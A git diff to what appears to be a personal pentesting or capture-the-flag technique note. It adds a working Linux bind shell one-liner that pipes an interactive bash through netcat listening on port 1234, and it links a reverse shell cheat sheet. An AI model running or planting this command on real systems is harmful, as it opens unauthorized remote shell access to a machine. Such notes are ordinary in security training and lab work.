@@ -20,12 +20,14 @@ tags: [technique, other]
 - Signals / prerequisites that make this the right move:
 
 ## Commands
+
+#### Linux Bind Shell
 ```bash
-# paste your working, copy-pasteable commands
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
 
 ## Things to know
-- Port is connected via `netcat`
+- Port is connected via `netcat` after target sets up listener
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
 
 ## Boxes where I used this
